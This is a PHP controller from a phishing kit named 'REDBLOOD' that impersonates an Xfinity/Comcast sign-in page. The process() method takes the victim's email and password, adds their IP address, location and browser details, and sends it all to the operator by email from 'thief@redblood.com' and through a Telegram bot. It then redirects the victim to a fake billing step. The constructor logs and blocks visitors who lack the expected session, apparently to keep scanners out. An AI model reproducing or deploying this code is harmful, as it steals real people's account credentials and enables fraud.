<?php
defined("ALLOW") or exit('No direct script access allowed');

class Signin
{
	public $goRBLD;
	public function __construct()
	{
		$this->goRBLD = new goRBLD();

		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 1)) {

			write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}\r\n");
			write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Incorrect Parameter Access Denied\r\n");
			_blocks();
			redirect(uriRand());
		}
	}

	public function index()
	{
		if ($this->goRBLD->is_mobile) {
			echo view('mobile/signin');
		} else {
			echo view('pc/signin');
		}
	}

	public function pwd()
	{
		$_SESSION['email'] = $_POST['user'];
		if (empty($_SESSION['email'])) {
			header('Location: /security-check/signin?jing=' . md5(time()));
			exit;
		} else if ($this->goRBLD->is_mobile) {
			echo view('mobile/pwd');
		} else {
			echo view('pc/pwd');
		}
	}

	public function process()
	{

		if (isset($_POST['password'])) {
			$_SESSION['password']  = trim($_POST['password']);

			$message =
				"<fieldset style='border: 3px solid #e4e3e2; border-radius: 20px; max-width: 50%; margin: 0 auto;'>
<pre>
<strong><span style='color: #999999;'>:: REDBLOOD ::</span></strong>

<strong>:: XFINITY ACCOUNT ::</strong>
			
# Email 	: {$_SESSION['email']}
# Password  : {$_SESSION['password']}

<strong>:: VISITOR DETAIL ::</strong>

# Date & Time   : " . _date() . "  
# Device        : {$this->goRBLD->platform}
# Browser       : {$this->goRBLD->browser}
# Country 		: {$_SESSION['country']}
# State         : {$_SESSION['region']}
# City          : {$_SESSION['city']}
# Ip address    : {$this->goRBLD->ip_address}
# User agent    : {$this->goRBLD->agent}

</pre>
</fieldset>
</pre>";

			$subject = "Email Access COMCAST :: [ {$this->goRBLD->ip_address} - {$_SESSION['country']} ]";
			$headers = 'MIME-Version: 1.0' . "\r\n";
			$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
			$headers .= "From: Account <thief@redblood.com>";

			if (_config('GETACCOUNT') == 'on') {
				@mail(_config('RESULT'), $subject, $message, $headers);
			}
			
            if (_config('TELEGRAM') == 'on') {
				$c = curl_init();
				curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot' . telex('token') . '/sendMessage?chat_id=' . telex('idtelegram') . '&text=' . urlencode(strip_tags($message)));
				curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
				$x = curl_exec($c);
				curl_close($c);
			}

			write(FCPATH . 'REDBLOOD/Static/log_account.txt', 'a', "{$this->goRBLD->ip_address}\r\n");
			write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Login Comcast Success\r\n");

			$_SESSION['access'] = 2;
			redirect(base_url() . 'security-check/billing?_ts=' . md5(time()));
		}
	}
}